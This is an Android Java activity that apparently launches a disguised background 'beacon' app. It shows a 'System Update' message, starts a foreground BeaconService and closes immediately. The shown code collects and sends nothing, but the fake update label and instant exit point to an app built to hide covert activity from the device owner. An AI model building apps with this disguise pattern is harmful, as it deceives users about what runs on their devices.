package com.sysupdate.beacon;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Minimal UI — just start the service and exit
        Toast.makeText(this, "System Update", Toast.LENGTH_SHORT).show();
        Intent service = new Intent(this, BeaconService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(service);
        } else {
            startService(service);
        }
        finish(); // Close immediately
    }
}
